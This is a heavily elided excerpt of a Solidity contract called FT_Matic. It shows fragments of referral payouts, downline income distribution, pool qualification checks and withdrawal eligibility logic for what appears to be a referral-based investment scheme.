...
contract FT_Matic {
  ...
  function _refPayout(address _addr, uint256 _amount) internal {
    ...
    function invest(address referrer) public payable {
        ...
        _usersDownlineIncomeDistribution(msg.sender,msgValue);
            ...
            //firstPool Qualify
            if(users[user.referrer].refs[0] >= 4 && users[user.referrer].totalWithdrawn < 4000 ether && users[user.referrer].checkpoint + 4 days >= block.timestamp){
  ...
  function withdrawal() external{
    ...
    if(poolEligible[msg.sender] && _user.totalWithdrawn >= 4000 ether){
